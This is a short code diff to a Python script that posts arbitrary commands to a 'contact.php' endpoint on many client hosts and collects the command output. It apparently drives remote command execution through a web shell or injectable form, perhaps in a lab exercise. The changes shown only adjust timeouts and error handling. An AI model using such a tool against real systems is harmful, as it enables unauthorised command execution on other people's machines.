@@ -44,7 +44,7 @@ ALL_ICMP = [
 ]
 
 PORT = 8080
-TIMEOUT = 45
+TIMEOUT = 30
 CONCURRENCY = 8
 THROTTLE_MS = 50
 
@@ -194,14 +194,18 @@ def send_command(client, port, command):
     url = f"http://{client}:{port}/contact.php"
     
     # Send as JSON data
-    headers = {"Content-Type": "application/json"}
     data = {"input_word": command}
 
     try:
         # Using form data approach
-        r = requests.post(url, json=data, headers=headers, timeout=TIMEOUT)
+        r = requests.post(url, json=data, timeout=(3, TIMEOUT))
         clean_text = r.text.replace('<pre>', '').replace('</pre>', '')
         return (client, r.status_code, clean_text)
+
+    except requests.exceptions.ConnectTimeout:
+        return (client, "ERR", "Could not connect to the server (timed out)")
+    except requests.exceptions.ReadTimeout:
+        return (client, "ERR", "Server took to long to respond with command output")
     except Exception as e:
         return (client, "ERR", str(e))
         
